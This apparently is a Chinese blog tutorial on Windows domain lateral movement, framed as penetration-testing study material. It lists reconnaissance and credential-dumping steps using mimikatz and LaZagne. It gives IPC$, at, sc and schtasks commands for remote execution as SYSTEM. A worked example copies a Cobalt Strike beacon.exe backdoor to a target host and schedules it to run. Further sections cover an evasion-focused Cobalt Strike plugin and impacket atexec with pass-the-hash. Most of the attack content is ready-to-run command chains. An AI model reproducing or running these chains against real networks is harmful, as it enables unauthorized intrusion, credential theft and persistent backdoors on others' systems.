# 原创
：  【内网安全-横向移动】IPC$连接---＞计划任务---＞上线

# 【内网安全-横向移动】IPC$连接---＞计划任务---＞上线

**目录**

[一、信息收集（目标&amp;用户&amp;密码）](#%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E7%9B%AE%E6%A0%87%26%E7%94%A8%E6%88%B7%26%E5%AF%86%E7%A0%81%EF%BC%89)

[1、简述](#1%E3%80%81%E7%AE%80%E8%BF%B0)

[1、收集信息充当字典](#1%E3%80%81%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF%E5%85%85%E5%BD%93%E5%AD%97%E5%85%B8)

[2、收集方法](#2%E3%80%81%E6%94%B6%E9%9B%86%E6%96%B9%E6%B3%95)

[二、横向移动](#%E4%BA%8C%E3%80%81%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8)

[1、ipc$](#1%E3%80%81ipc%24)

[2、at命令](#2%E3%80%81at%E5%91%BD%E4%BB%A4)

[3、sc命令：](#3%E3%80%81sc%E5%91%BD%E4%BB%A4%EF%BC%9A)

[4、schtasks(计划任务)](#4%E3%80%81schtasks%28%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%29)

[三、利用示例](#%E4%B8%89%E3%80%81%E5%88%A9%E7%94%A8%E7%A4%BA%E4%BE%8B)

[1、流程：](#1%E3%80%81%E6%B5%81%E7%A8%8B%EF%BC%9A)

[2、示例：](#2%E3%80%81%E7%A4%BA%E4%BE%8B%EF%BC%9A)

[四、工具](#%E5%9B%9B%E3%80%81%E5%B7%A5%E5%85%B7)

[1、cs插件---LSTAR - Aggressor](#1%E3%80%81cs%E6%8F%92%E4%BB%B6---LSTAR%20-%20Aggressor)

[2、impacket-atexec](#2%E3%80%81impacket-atexec)

---


## 一、信息收集（目标&amp;用户&amp;密码）

### 1、简述

> 
<h4>1、收集信息充当字典</h4>
1）目标字典：域内网络列表
2）用户字典：域内用户组列表
3）密码字典：域内密码


> 
<h4>2、收集方法</h4>
命令+工具
<pre><code>应用&amp;服务&amp;权限
systeminfo         详细信息
netstat -ano       端口列表
route print        路由表
net start          启动服务
tasklist           进程列表
schtasks           计划任务
ipconfig /all      判断存在域
net view /domain   判断存在域
net time /domain   判断主域
netstat -ano       当前网络端口开放
nslookup 域名       追踪来源地址
wmic service list brief          查询本机服务
net config workstation           查询当前登录域及登录用户信息
wmic startup get command,caption 查看已启动的程序信息
 
 
 
网络&amp;用户&amp;域控
net view /domain   查询域列表
net time/domain    从域控查询时间，若当前用户是域用户会从域控返回当前时间，亦用来判 断主域，主域一般用做时间服务器
net localgroup administrators 本机管理员【通常含有域用户】
net user /domain   查询域用户(当前域)
net group /domain  查询域工作组
net group "domain computers" /domain   查看加入域的所有计算机名
net group "domain admins" /domain      查询域管理员用户组和域管用户
net localgroup administrators /domain  查看域管理员
net group "domain controllers" /domain 查看域控
net accounts /domain 查看域密码策略
 
 
密码&amp;凭据&amp;口令
1、用户HASH，明文获取-mimikatz(win)，mimipenguin(linux)
https://github.com/gentilkiwi/mimikatz/
https://github.com/huntergregal/mimipenguin
2、各种协议服务口令获取-LaZagne(all)，XenArmor(win)，CS插件
https://github.com/AlessandroZ/LaZagne/
https://xenarmor.com/allinone-password-recovery-pro-software/
3.站点源码备份文件、数据库备份文件等
4.各类数据库Web管理入口，如PHPMyAdmin
5.浏览器保存密码、浏览器Cookies
6.其他用户会话、3389和ipc$连接记录、回收站内容
7.Windows 保存的WIFI密码
8.网络内部的各种帐号和密码，如：Email、VPN、FTP、OA等</code></pre>



---


---


## 二、横向移动

> 
<h3>1、ipc$</h3>
1、IPC$：(Internet Process Connection)是"共享命名管道"的资源
<hr/>
2、作用：为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限,在远程管理计算机和查看计算机的共享资源时使用（可以获取目标主机上的目录结构、用户列表等信息）
<hr/>
3、利用条件：
139/445端口开启：都可单独实现文件共享
IPC$连接默认走445端口（SMB协议），不通则走139端口（NetBIOS协议）（有的会强制走445端口）
<hr/>
4、空连接：
即ipc$连接时，不需要账号密码（无权限）
如果使用用户、管理员的身份登陆（有权限）
<hr/>
5、默认共享：
默认共享是为了方便管理员远程管理而默认开启的共享（所有逻辑盘、系统目录），通过ipc连接进行访问
<hr/>
6、权限问题：
方法一：域管用户有权限对admin$目录建立IPC连接
方法二：本地的Administrator用户（默认情况下被禁用），可以使用Administrator用户远程连接
<hr/>
7、ipc$连接失败错误号
<pre><code>错误号 5    拒绝访问---&gt;可能使用的用户不是管理员权限---&gt;提升权限
错误号 51   Windows无法找到网络路径---&gt;网络有问题
错误号 53   找不到网络路径---&gt;ip 地址错误；目标未开机；目标 lanmanserver 服务未启动；目标有防火墙（端口过滤）
错误号 67   找不到网络名---&gt;lanmanworkstation 服务未启动；目标删除了 ipc$
错误号 1219   提供的凭据与已存在的凭据集冲突---&gt;已经和对方建立了一个ipc$---&gt;删除后再连
错误号 1326   未知的用户名或错误密码
错误号 1385   登录失败：未授予用户在此计算机上的请求登录类型---&gt;可能“拒绝从网络访问这台计算机”功能中拒绝了该用户的访问；ipc$连接时，输入的用户不存在
错误号 1792   试图登录，但是网络登录服务没有启动---&gt;目标NetLogon服务未启动[连接域控会出现此情况]
错误号 2242   此用户的密码已经过期---&gt;目标有帐号策略，强制定期要求更改密码

常见原因：
（1）目标系统不是NT或以上的操作系统
（2）对方未打开IPC$共享
（3）对方未开启139、445端口
（4）防火墙端口未开放
（5）命令、账号密码有错误
</code></pre>
<hr/>
8、IPC$常用命令：
<pre><code>net use \\192.168.*.*\ipc$ "" /u:""                         #建立空连接
net use \\192.168.*.*\ipc$ "密码" /user:"Administrator"     #建立正常连接
net use                               #查看本机连接共享情况
dir \\xx.xx.xx.xx\C$\                 #查看文件列表
net view \\192.168.*.*                #查看已建立连接目标主机的共享资源
net time \\192.168.*.*                #查看目标主机时间
nbtstat -A 192.168.*.*                #查看目标主机的NetBIOS用户（自己本机也需开启）
net use \\192.168.*.*\ipc$ /del /y    #删除本机与指定ip建立的连接
net use * /del /y                     #删除本机所有已建立的连接
copy 1.exe \\192.168.*.*\c$\windows\temp\1.exe    #文件的上传下载
copy vps.exe \192.168.*.*\c$          #将本目录下的指定文件复制到目标系统中
xcopy d:\sqlitedata\*.* \\192.168.*.*\c$\temp /E /Y /D         #上传本地文件到目标的:c\windows\temp\目录下
copy \\192.168.*.*\c$\plugin_update.exe c:\                    #下载目标文件到本地c盘下
net share c$ /del                     #删除默认共享
net share c$=c:                       #恢复默认共享
net use z: \\192.168.*.*\c$ "密码" /user:"administrator"   #映射路径：对方的c盘映射为自己的z盘(其他盘类推)
net use z: \\192.168.*.*\c$   #访问
net use c: /del               #删除映射的c盘
net use * /del                #删除全部,会有提示要求按y确认</code></pre>



---


---


---


> 
<h3>2、at命令</h3>
1、简述：定时计划任务（安装 at 软件包+开启 atd 服务）
<hr/>
2、常用命令
<pre><code>at \192.168.*.* 17:00:00 C:\vps.exe     #使用at创建计划任务
at \192.168.*.* 作业ID /delete          #清除at记录
at \192.168.*.* 17:00:00 cmd.exe /c "ipconfig &gt; C:/1.txt "    #使用at命令执行，将执行结果写入本地文本文件，再使用type命令查看该文件的内容
type \192.168.*.*\C$\1.txt              #查看生成的1.txt文件
at \\192.168.*.* 11:23 cmd /c "c:\windows\temp\test.bat"      #设置定时任务，cmd下执行批处理脚本</code></pre>



> 
<h3>3、sc命令：</h3>
1、简述：SC命令是XP系统中功能强大的DOS命令,SC命令能与“服务控制器”和已安装设备进行通讯。SC是用于与服务控制管理器和服务进行通信的命令行程序
<hr/>
2、功能：
1）检索和设置有关服务的控制信息
2）更改服务的启动状态：设置存储在注册表中的服务属性，以控制如何在启动时启动服务应用程序，以及如何将其作为后台程序运行
3）删除系统中的无用的服务
4）配置指定的服务，检索当前服务的状态，也可以停止和启动服务（功能上类似NET STOP/START命令，但SC速度更快且能停止更多的服务）
5）创建批处理文件来调用不同的 SC 命令，以自动启动或关闭服务序列
<hr/>
3、格式：
SC命令不能单独使用，必须和其它的命令结合起来一起使用
<pre><code>24个：
sc boot　
sc config　
sc continue　
sc control　
sc create　
sc delete　
sc descrīption　
sc enumdepend
sc failure　
sc getdisplayname　
sc getkeyname　
sc interrogate　
sc lock　
sc pause　
sc qc
sc qdescrīption　
sc qfailure　
sc query　
sc queryex　
sc querylock　
sc sdset 
sc sdshow
sc　start　
sc stop</code></pre>
SC命令的格式：SC [Servername] command Servicename [Optionname= Optionvalues]
<pre><code>1、Servername：指定服务所在的远程服务器的名称。名称必须采用通用命名约定 (UNC) 格式（“\\myserver”）。要在本地运行SC.exe，请忽略此参数。

2、command ：即以上提到的那24个命令（SC后面的那个，如query,start,stop,create,config等）

3、Servicename：服务名，也就是要配置的那个服务的名字，例如你要启动一个服务你就输入sc start +你要启动的服务名。（注意这里的服务名不是服务的显示名称，而是服务名称，这个服务名称可以在系统管理工具下的服务中可以看到，例如在服务中双击DHCP Client可以看到其服务名称是Dhcp，而那个DHCP Client是显示名称，可以用sc命令来更改一个服务的显示名称）

4、Optionname= Optionvalues：是选项名和选项的值。</code></pre>
<hr/>
4、示例：
要在开机是系统自动加载themes服务，可以使用
<pre>`sc config themes start= auto`</pre>
后面的start就是选项，auto是选项的值。（注意=号后面有个空格，所有的使用选项的在=号后面都要加个空格再加上选项值）
<hr/>
5、使用：
<pre><code>#copy到目标主机
copy test.exe \\192.168.*.*\c$

#创建计划任务
sc \\192.168.*.* create shell binpath= "c:\test.exe" start= auto displayname= "shellstart"
sc \\192.168.*.* create test binpath= "c:\windows\temp\test.bat" start= auto displayname= "shellstart"

#启动、停止、删除
sc \\192.168.*.* start test
sc \\192.168.*.* stop test
sc \\192.168.*.* del test</code></pre>



---


---


> 
<h3>4、schtasks(计划任务)</h3>
1、简述：计划定期或在特定时间运行的命令和程序，在计划中添加和删除任务，按需启动和停止任务，以及显示和更改计划的任务（也可使用schtasks.exe工具）
<hr/>
2、优缺点：Windows Vista、Windows Server 2008及之后版本的操作系统已经弃用at命令，而转为用schtasks命令。schtasks命令比 at 命令更灵活。在使用schtasks命令时，会在系统中留下日志文件：C:\Windows\Tasks\SchedLgU.txt
<hr/>
3、权限：
1）若要计划、查看和更改本地计算机上的所有任务，必须是管理员组的成员
——————
2）若要计划、查看和更改远程计算机上的所有任务，必须是远程计算机上的 Administrators 组的成员，或者必须使用 **/u** 参数提供远程计算机管理员的凭据
——————
3）如果本地计算机和远程计算机位于同一域中，或者本地计算机位于远程计算机域信任的域中，则可以在 /create 或 /change 操作中使用 /u 参数。 否则，远程计算机无法对指定的用户帐户进行身份验证，并且无法验证该帐户是否为 Administrators 组的成员
——————
4）计划运行的任务必须具有相应的权限;这些权限因任务而异。 默认情况下，任务使用本地计算机的当前用户的权限运行，或者使用 由 /u 参数指定的用户的权限。 若要使用不同用户帐户的权限或系统权限运行任务，请使用 /ru 参数
<hr/>
4、语法：
<pre><code>schtasks /change    #更改任务的以下一个或多个属性：任务运行的程序 (/tr)；运行任务的用户帐户 (/ru)；用户帐户的密码 (/rp)；将仅交互式属性添加到任务 (/it)
schtasks /create    #计划新任务
schtasks /delete    #删除计划任务
schtasks /end       #停止任务启动的程序
schtasks /query     #显示计划在计算机上运行的任务
schtasks /run       #立即启动计划任务。 运行操作会忽略计划，但使用任务中保存的程序文件位置、用户帐户和密码立即运行任务</code></pre>
（相关命令来自于Microsoft官方文档）
schtasks /create创建计划任务：参数
<pre><code>#/sc 启动时间参数为MINUTE、HOURLY、DAILY、WEEKLY等时，需要指定/mo运行的间隔时间
/sc onlogon      用户登录时启动
/sc onstart      系统启动时启动
/sc onidle       系统空闲时启动

参数：
/sc   计划任务类型，可选值为MINUTE、HOURLY、DAILY、WEEKLY、ONCE、ONSTART、ONLOGON、ONIDLE、MONTHLY、ONEVENT
/tn   计划任务名称，后续查询、修改、删除、执行时使用
/tr   需要运行的程序或命令，传入的命令中间如果有空格会被截断为程序和参数，因此需要将双引号转义并传入。
/ru   运行任务的用户账户名，不使用此参数的话使用执行schtasks命令的账户运行计划任务
/rp   运行任务的用户账户密码
/mo   指定任务在计划类型中的运行间隔
/d    指定任务在一个月或者星期的某一天运行，只适用于MONTHLY和WEEKLY类型。
/m    指定任务在某个月运行，只适用于MONTHLY类型。
/i    当计划任务类型为ONIDLE时，运行任务前计算机处于空闲状态的分钟数。
/st    当计划任务类型为MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY时使用，指定任务的开始时间，默认为本地计算机的当前时间。
/ri   指定计划任务的重复间隔，以分钟为单位。不适合计划类型：MINUTE、HOURLY、ONSTART、ONLOGON、ONIDLE
/et   指定计划任务的结束时间，适用于计划类型：MINUTE、HOURLY， 在指定的结束时间之后，schtasks 不会再次启动任务，除非当前系统时间调回开始时间。默认情况下，没有结束时间。
/du   指定任务计划的持续时间，与/et类似，默认情况下没有持续时间。
/k    在指定计划任务的结束时间或持续时间后停止任务，如果不加此参数，则在时间到了会继续运行或者重启该任务。
/it   只在用户登录时运行
/z    在任务计划完成后删除任务计划
/f    在创建任务时如果任务已存在不显示警告
/RL   为作业设置运行级别。有效值为LIMITED 和 HIGHEST。默认值为 LIMITED。
/F    如果指定的任务已经存在，则强制创建任务并抑制警告。</code></pre>
<hr/>
5、常用命令：
<pre><code>schtasks /create /s 192.168.*.* /tn test /sc HOURLY /mo 1 /tr c:\vps.exe /ru system /f    #在目标主机上创建一个名为test的计划任务，启动程序为C:\vps.exe，启动权限为system，启动时间为每隔一小时启动一次


schtasks /query | findstr test                    #查询该test计划任务
schtasks /run /s 192.168.*.* /i /tn "test"        #启动该test计划任务
schtasks /delete /s 192.168.*.* /tn "test" /f     #删除该test计划任务

注意：查看目标主机时间（可能不一样的，嘿嘿嘿）

#创建计划任务
schtasks /create /tn "plugin_update" /tr c:\windows\temp\plugin_update.exe /sc once /st 12:00 /S 192.168.*.* /RU System /u administrator /p "密码"

#立即执行计划任务
schtasks /run /tn "plugin_update" /S 192.168.*.* /u administrator /p "密码"

#删除计划任务
schtasks /F /delete /tn "plugin_update" /S 192.168.*.* /u administrator /p "密码"

#计划任务远程开启默认共享
schtasks /create /tn "plugin_update" /tr "cmd /c net share c$=c:" /sc once /st 12:00 /S 192.168.*.* /RU System /u administrator /p "密码"</code></pre>



---


---


---


---


## 三、利用示例

> 
<h3>1、流程：</h3>
1）横向移动：ipc连接----&gt;创建计划任务(at|schtasks)----&gt;执行计划任务---&gt;impacket-atexec尝试连接
<hr/>
2）上线：复制后门/利用命令下载后门----&gt;执行后门文件/相关命令


> 
<h3>2、示例：</h3>
1）at命令
<pre><code>net use \\192.168.3.21\ipc$ "密码" /user:god.org\administrator     # 建立ipc连接（域名主机名）
copy beacon.exe \\192.168.*.*\c$       #上传马：copy执行文件到目标主机
net time \\192.168.*.*                 #查看时间
at \\192.168.*.* 12:00 c:\beacon.exe   #添加计划任务
</code></pre>
<hr/>
2）schtasks命令
<pre><code>net use \\192.168.*.*\ipc$ "密码" /user:god.org\administrator # 建立ipc连接（域名主机名）
copy beacon.exe \\192.168.*.*\c$           #复制文件到其C盘
net time \\192.168.*.*                     #查看时间
schtasks /create /s 192.168.*.* /u administrator /p 密码 /sc DAILY /tn beacon /tr 'c:\4.exe'  /ST 12:00 /f                   #创beacon任务对应执行文件
schtasks /run /s 192.168.*.* /tn beacon /i        #运行beacon任务
schtasks /delete /s 192.168.*.* /tn beacon /f     #删除beacon任务</code></pre>



---


---


## 四、工具

> 
<h3>1、cs插件---LSTAR - Aggressor</h3>
1）简述：
<pre><code>1、一个插件从上线到域控 实现内网漫游

2、本着简化 CS 右键和方便自己集成的目的，参考大量后渗透插件

3、重构和丰富了主机相关凭据获取、多级内网穿透、隐蔽计划任务、免杀的 Mimikatz 和克隆添加用户等功能

4、功能特性：

通过配合 CobaltStrike 的 TCP、SMB、Proxy 等不出网主机上线方式，穿透复杂网络环境
针对 RDP 相关、AddUser、LsassDump 等功能提供多种免杀执行方式，应对冷门环境
集成多个使用 WinAPI 或 Assembly 内存加载方式运行的影子用户、隐蔽计划任务等免杀功能</code></pre>
<hr/>
2）项目地址：
[lintstar/LSTAR: LSTAR - CobaltStrike 综合后渗透插件 (github.com)<img alt="icon-default.png?t=N0U7" src="https://csdnimg.cn/release/blog_editor_html/release2.2.2/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N0U7"/>https://github.com/lintstar/LSTAR](https://github.com/lintstar/LSTAR)<img alt="" height="439" src="https://img-blog.csdnimg.cn/95b61c0372ba4e8b9e6788907c134cd6.png" width="1001"/>
（项目简述来自项目地址） 


> 
<h3>2、impacket-atexec</h3>
1）简述：
Impack是一组用于处理网络协议的Python类的集合。Impack专注于提供对数据包的低级编程访问，并为某些协议（例如SMB1-3和MSRPC）提供协议实现本身。数据包可以从头开始构建，也可以从原始数据中解析，面向对象的API使处理协议的深层层次结构变得简单。该库提供了一组工具作为示例，说明可以在该库的上下文中完成什么
（来自项目地址）
<hr/>
2）作用：
该工具是一个半交互的工具，适用于Webshell下，Socks代理下;在渗透利用中可以收集用户名、明文密码、密码hash、远程主机等做成字典，批量测试
<hr/>
3）项目地址（py版）
[fortra/impacket: Impacket is a collection of Python classes for working with network protocols. (github.com)<img alt="icon-default.png?t=N0U7" src="https://csdnimg.cn/release/blog_editor_html/release2.2.2/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N0U7"/>https://github.com/fortra/impacket](https://github.com/fortra/impacket)
<hr/>
4）示例：
<pre><code>python atexec.py god/administrator:Admin12345@192.168.*.* "ver"
python atexec.py -hashes :…… ./administrator@192.168.*.* "whoami"
</code></pre>

<hr/>
5）Exe版：
[RichChigga/impacket-examples-windows (gitee.com)<img alt="icon-default.png?t=N0U7" src="https://csdnimg.cn/release/blog_editor_html/release2.2.2/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N0U7"/>https://gitee.com/RichChigga/impacket-examples-windows](https://gitee.com/RichChigga/impacket-examples-windows)<img alt="" height="936" src="https://img-blog.csdnimg.cn/119f6efb2c844b418ecb2fbfd4d8249e.png" width="1180"/>

<pre><code>CS本地用户明文连接：
shell atexec.exe ./administrator:密码@192.168.*.* "whoami"

CS域内用户明文连接：
shell atexec.exe god/administrator:密码@192.168.*.* "ver"

CS域内本地用户明文密文连接：
shell atexec.exe -hashes :…… ./administrator@192.168.*.* "whoami"
shell atexec.exe -hashes :…… god/administrator@192.168.*.* "whoami"
</code></pre>



---


---

